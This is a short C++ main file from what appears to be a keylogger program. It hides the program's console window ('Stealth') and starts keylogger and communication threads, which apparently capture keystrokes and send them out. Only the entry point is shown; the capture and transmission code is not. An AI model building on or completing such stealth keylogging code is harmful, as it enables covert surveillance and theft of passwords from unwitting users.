#include "Thread.h"

int	main(void) {
	Thread					thread;
	Keylogger				kLogger;
	Com						com;

	try {
		//// Hide program console
		kLogger.Stealth();
		// Launch keylogger and com threads
		thread.InitThreads(kLogger, com);
		// Close all thread handles and free memory allocations.
		thread.CloseThread();
	}
	catch (std::exception& e) {
		std::cerr << "Exception: " << e.what() << "\n";
		//while (1);
		return 1;
	}
	return 0;
}